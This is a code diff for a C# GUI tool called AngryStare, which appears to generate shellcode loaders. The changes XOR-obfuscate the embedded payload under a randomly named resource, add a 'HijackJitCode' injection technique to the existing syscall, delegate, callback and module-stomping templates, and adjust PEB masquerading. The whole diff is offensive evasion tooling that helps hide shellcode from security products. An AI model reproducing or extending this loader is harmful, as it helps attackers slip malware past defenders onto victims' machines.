@@ -35,7 +35,7 @@ namespace AngryStare
         public byte[] BuffByte;
         public static bool UseRaw = false;
         public static string exeordll = "winexe";
-        
+        public static string ResourceName = HatTrick.Obfuscate.RandomString(10);
 
 
         public MainWindow()
@@ -61,12 +61,12 @@ namespace AngryStare
                 if (UseRaw == true)
                 {
                     Console.WriteLine($"[+] Use Raw: {Rawbinpath.Text}");
-                    DealWithShellcode.StackShellCode.StackGen(new byte[] { 0x00 }, SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);
+                    DealWithShellcode.StackShellCode.StackGen(new byte[] { 0x00 }, SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text,ResourceName);
 
                 }
                 else 
                 { 
-                    DealWithShellcode.StackShellCode.StackGen(GetBuffer(), SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);
+                    DealWithShellcode.StackShellCode.StackGen(GetBuffer(), SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text,"");
                     Console.WriteLine("[+] Generating template Successful");
                 }
             }
@@ -104,7 +104,17 @@ namespace AngryStare
             {
 
                 ModuleDefMD module = ModuleDefMD.Load(outputfile.Text);
-                module.Resources.Add(new EmbeddedResource("dotnetlib", File.ReadAllBytes(Rawbinpath.Text)));
+
+                byte[] binbyte = File.ReadAllBytes(Rawbinpath.Text);
+                for (int i = 0; i < binbyte.Length; i++) 
+                {
+                    binbyte[i] ^= 0x2e;
+                    binbyte[i] ^= 0x4e;
+
+                }
+              
+                module.Resources.Add(new EmbeddedResource(ResourceName, binbyte));
+              //  module.Resources.Add(new EmbeddedResource("dotnetlib", File.ReadAllBytes(Rawbinpath.Text)));
                 if (dllorexe.SelectedItem.ToString() == "DLL")
                 {
                     module.Write(outputfile.Text.TrimEnd('l'));
@@ -160,7 +170,7 @@ namespace AngryStare
             
             Console.WriteLine($"[+] Complier Over : {outputfile.Text}");
 
-            DealWithShellcode.StackShellCode.StackGen(new byte[] {0x00}, SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);
+            DealWithShellcode.StackShellCode.StackGen(new byte[] {0x00}, SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text,"");
 
         }
         public void SetCompilerBox()
@@ -331,7 +341,7 @@ namespace AngryStare
         private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
         {
 
-            string[] FilePath = { "MySyscall", "NETDelegate", "CallWinProCallBacK", "ModuleStomp" };
+            string[] FilePath = { "MySyscall", "NETDelegate", "CallWinProCallBacK", "ModuleStomp","HijackJitCode"};
             foreach (string a in FilePath) 
             {
                 foreach (var csfile in Directory.GetFiles(Directory.GetParent(Environment.CurrentDirectory).ToString() + $@"\Technique\{a}"))
@@ -347,10 +357,10 @@ namespace AngryStare
         }
         public static void WirteProgramWithHT(string ProgramPath, string tech, string pebfile,bool MasqueradePEB) 
         {
-            //if (exeordll == "library") 
-            //{
-            //    return;
-            //}
+            if (exeordll == "library")
+            {
+                return;
+            }
             String MasqueradePEBString = string.Empty;
 
             FileStream fs = new FileStream(ProgramPath + @"\Program.cs", FileMode.Create);
